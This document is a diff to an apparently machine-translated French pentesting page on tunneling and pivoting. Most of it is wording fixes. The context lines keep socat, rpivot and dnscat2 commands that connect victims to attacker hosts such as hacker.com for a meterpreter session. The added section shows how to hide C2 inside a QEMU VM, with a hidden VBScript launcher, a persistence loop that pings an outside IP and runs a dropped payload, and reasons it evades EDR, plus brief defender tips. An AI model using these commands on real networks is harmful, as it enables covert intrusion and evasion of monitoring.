@@ -89,7 +89,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 > [!NOTE]
 > **Sécurité – Attaque Terrapin (CVE-2023-48795)**
-> L'attaque de rétrogradation Terrapin 2023 peut permettre à un attaquant de type homme du milieu de manipuler le début de la poignée de main SSH et d'injecter des données dans **n'importe quel canal transféré** ( `-L`, `-R`, `-D` ). Assurez-vous que le client et le serveur sont corrigés (**OpenSSH ≥ 9.6/LibreSSH 6.7**) ou désactivez explicitement les algorithmes vulnérables `chacha20-poly1305@openssh.com` et `*-etm@openssh.com` dans `sshd_config`/`ssh_config` avant de compter sur les tunnels SSH.
+> L'attaque de rétrogradation Terrapin 2023 peut permettre à un homme du milieu de manipuler la première poignée de main SSH et d'injecter des données dans **n'importe quel canal transféré** ( `-L`, `-R`, `-D` ). Assurez-vous que le client et le serveur sont corrigés (**OpenSSH ≥ 9.6/LibreSSH 6.7**) ou désactivez explicitement les algorithmes vulnérables `chacha20-poly1305@openssh.com` et `*-etm@openssh.com` dans `sshd_config`/`ssh_config` avant de compter sur les tunnels SSH.
 
 ## SSHUTTLE
 
@@ -163,7 +163,7 @@ rportfwd stop [bind port]
 ### rPort2Port local
 
 > [!WARNING]
-> Dans ce cas, le **port est ouvert dans l'hôte beacon**, pas dans le Team Server et le **trafic est envoyé au client Cobalt Strike** (pas au Team Server) et de là au hôte:port indiqué.
+> Dans ce cas, le **port est ouvert sur l'hôte beacon**, pas sur le Team Server et le **trafic est envoyé au client Cobalt Strike** (pas au Team Server) et de là au hôte:port indiqué.
 ```bash
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
@@ -250,7 +250,7 @@ attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
 ```
-Pivot à travers **NTLM proxy**
+Pivot through **NTLM proxy**
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
 ```
@@ -290,7 +290,7 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-Vous pouvez contourner un **proxy non authentifié** en exécutant cette ligne à la place de la dernière dans la console de la victime :
+Vous pouvez contourner un **proxy non authentifié** en exécutant cette ligne au lieu de la dernière dans la console de la victime :
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
@@ -316,7 +316,7 @@ victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.
 ```
 ### Remote Port2Port
 
-Connectez le port SSH local (22) au port 443 de l'hôte attaquant.
+Connectez le port SSH local (22) au port 443 de l'hôte attaquant
 ```bash
 attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
 victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
@@ -434,7 +434,7 @@ victim> ./dnscat2 --dns host=10.10.10.10,port=5353
 ```
 #### **Dans PowerShell**
 
-Vous pouvez utiliser [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) pour exécuter un client dnscat2 dans powershell :
+Vous pouvez utiliser [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) pour exécuter un client dnscat2 dans PowerShell :
 ```
 Import-Module .\dnscat2.ps1
 Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
@@ -484,7 +484,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 [**ngrok**](https://ngrok.com/) **est un outil pour exposer des solutions à Internet en une ligne de commande.**\
-_Les URI d'exposition sont comme :_ **UID.ngrok.io**
+_Exposition URI sont comme:_ **UID.ngrok.io**
 
 ### Installation
 
@@ -547,7 +547,7 @@ addr: file:///tmp/httpbin/
 ```
 ## Cloudflared (Cloudflare Tunnel)
 
-Le démon `cloudflared` de Cloudflare peut créer des tunnels sortants qui exposent des **services TCP/UDP locaux** sans nécessiter de règles de pare-feu entrant, en utilisant l'edge de Cloudflare comme point de rendez-vous. Cela est très pratique lorsque le pare-feu de sortie n'autorise que le trafic HTTPS mais que les connexions entrantes sont bloquées.
+Le démon `cloudflared` de Cloudflare peut créer des tunnels sortants qui exposent **des services TCP/UDP locaux** sans nécessiter de règles de pare-feu entrant, en utilisant l'edge de Cloudflare comme point de rendez-vous. Cela est très pratique lorsque le pare-feu de sortie n'autorise que le trafic HTTPS mais que les connexions entrantes sont bloquées.
 
 ### Quick tunnel one-liner
 ```bash
@@ -599,7 +599,7 @@ localIP    = "127.0.0.1"
 localPort  = 3389
 remotePort = 5000
 ```
-### Utilisation du nouveau SSH gateway (pas de binaire frpc)
+### Utilisation du nouveau passerelle SSH (pas de binaire frpc)
 ```bash
 # On frps (attacker)
 sshTunnelGateway.bindPort = 2200   # add to frps.toml
@@ -608,11 +608,69 @@ sshTunnelGateway.bindPort = 2200   # add to frps.toml
 # On victim (OpenSSH client only)
 ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
 ```
-La commande ci-dessus publie le port de la victime **8080** en tant que **attacker_ip:9000** sans déployer d'outils supplémentaires – idéal pour le pivotement en vivant des ressources disponibles.
+La commande ci-dessus publie le port de la victime **8080** en tant que **attacker_ip:9000** sans déployer d'outils supplémentaires – idéal pour le pivotement en vivant sur le terrain.
+
+## Tunnels VM discrets avec QEMU
+
+Le réseau en mode utilisateur de QEMU (`-netdev user`) prend en charge une option appelée `hostfwd` qui **lie un port TCP/UDP sur l'*hôte* et le redirige vers le *client***. Lorsque le client exécute un démon SSH complet, la règle hostfwd vous donne une boîte de saut SSH jetable qui vit entièrement à l'intérieur d'une VM éphémère – parfaite pour cacher le trafic C2 des EDR car toute activité et tous les fichiers malveillants restent sur le disque virtuel.
+
+### Ligne de commande rapide
+```powershell
+# Windows victim (no admin rights, no driver install – portable binaries only)
+qemu-system-x86_64.exe ^
+-m 256M ^
+-drive file=tc.qcow2,if=ide ^
+-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
+-device e1000,netdev=n0 ^
+-nographic
+```
+• La commande ci-dessus lance une image **Tiny Core Linux** (`tc.qcow2`) dans la RAM.  
+• Le port **2222/tcp** sur l'hôte Windows est transféré de manière transparente vers **22/tcp** à l'intérieur de l'invité.  
+• Du point de vue de l'attaquant, la cible expose simplement le port 2222 ; tous les paquets qui l'atteignent sont gérés par le serveur SSH s'exécutant dans la VM.  
+
+### Lancement furtif via VBScript
+```vb
+' update.vbs – lived in C:\ProgramData\update
+Set o = CreateObject("Wscript.Shell")
+o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
+```
+Exécuter le script avec `cscript.exe //B update.vbs` garde la fenêtre cachée.
+
+### Persistance dans l'invité
+
+Parce que Tiny Core est sans état, les attaquants généralement :
+
+1. Déposent le payload dans `/opt/123.out`
+2. Ajoutent à `/opt/bootlocal.sh` :
+
+```sh
+while ! ping -c1 45.77.4.101; do sleep 2; done
+/opt/123.out
+```
+
+3. Ajoutent `home/tc` et `opt` à `/opt/filetool.lst` afin que le payload soit empaqueté dans `mydata.tgz` lors de l'arrêt.
+
+### Pourquoi cela évite la détection
+
+• Seules deux exécutables non signés (`qemu-system-*.exe`) touchent le disque ; aucun pilote ou service n'est installé.  
+• Les produits de sécurité sur l'hôte voient **un trafic de boucle de retour bénin** (le C2 réel se termine à l'intérieur de la VM).  
+• Les analyseurs de mémoire n'analysent jamais l'espace de processus malveillant car il vit dans un autre OS.
+
+### Conseils pour Defender
+
+• Alertez sur **des binaires QEMU/VirtualBox/KVM inattendus** dans des chemins accessibles en écriture par l'utilisateur.  
+• Bloquez les connexions sortantes qui proviennent de `qemu-system*.exe`.  
+• Recherchez des ports d'écoute rares (2222, 10022, …) se liant immédiatement après un lancement de QEMU.
+
+---
 
 ## Autres outils à vérifier
 
-- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
-- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
+- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)  
+- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)  
+
+## Références
+
+- [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)  
 
 {{#include ../banners/hacktricks-training.md}}
